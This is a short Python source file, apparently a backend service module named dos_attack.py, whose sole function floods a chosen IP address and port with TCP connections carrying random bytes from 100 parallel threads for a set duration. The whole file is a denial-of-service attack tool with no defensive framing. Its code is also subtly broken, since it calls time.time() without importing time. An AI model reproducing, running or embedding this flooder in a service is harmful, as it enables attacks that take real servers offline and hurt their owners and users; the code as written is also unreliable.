# backend/services/dos_attack.py

import socket
import random
import threading

def tcp_flood(target_ip: str, target_port: int, duration: int = 10) -> dict:
    timeout = time.time() + duration
    sent = 0

    def attack():
        nonlocal sent
        while time.time() < timeout:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(random._urandom(1024))
                sent += 1
                s.close()
            except:
                continue

    threads = [threading.Thread(target=attack) for _ in range(100)]
    for t in threads: t.start()
    for t in threads: t.join()

    return {"status": "completed", "packets_sent": sent}
